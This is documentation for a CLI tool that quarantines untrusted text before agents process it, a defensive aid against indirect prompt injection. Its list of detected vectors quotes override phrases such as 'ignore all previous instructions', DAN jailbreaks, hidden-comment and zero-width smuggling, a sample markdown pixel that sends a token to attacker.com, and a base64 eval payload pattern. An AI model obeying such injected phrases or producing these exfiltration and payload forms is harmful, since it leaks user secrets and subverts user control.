# Prompt Injection Quarantine (`aegis quarantine`)

When autonomous agents process external data (e.g. GitHub issue descriptions, bug reports, scraped web content, or PR reviews), they are exposed to **Indirect Prompt Injections**.

---

## 🛡️ Neutralized Attack Vectors

1. **Instruction Overrides:**
   - Detects phrases like *"ignore all previous instructions"*, *"system override"*, *"disregard prior directives"*.
2. **Persona Hijacking & Jailbreaks:**
   - Detects attempts to force the model into DAN mode, unfiltered mode, or root execution roles.
3. **Hidden HTML Comments:**
   - Strips malicious commands hidden inside HTML comments (`<!-- ... -->`) that humans cannot easily see in web views.
4. **Zero-Width Steganography:**
   - Strips invisible unicode characters (`\u200b`, `\u200c`, `\ufeff`, `\u202e`) used to bypass naive keyword filters or smuggle hidden tokens into context.
5. **Markdown Exfiltration Pixels:**
   - Blocks image markdown tags containing parameter exfiltration hooks (`![pixel](https://attacker.com/log?token=...)`).
6. **Base64 Payload Execution:**
   - Detects obfuscated base64 code execution attempts (`eval(base64.b64decode(...))`).

---

## 💻 CLI Usage

```bash
# Sanitize untrusted markdown file before passing to agent:
aegis quarantine issue_body.md

# Pipe via stdin with strict mode (fails with exit code 1 if threat found):
cat comment.txt | aegis quarantine - --strict

# Machine-readable JSON output:
aegis quarantine issue.md --json
```
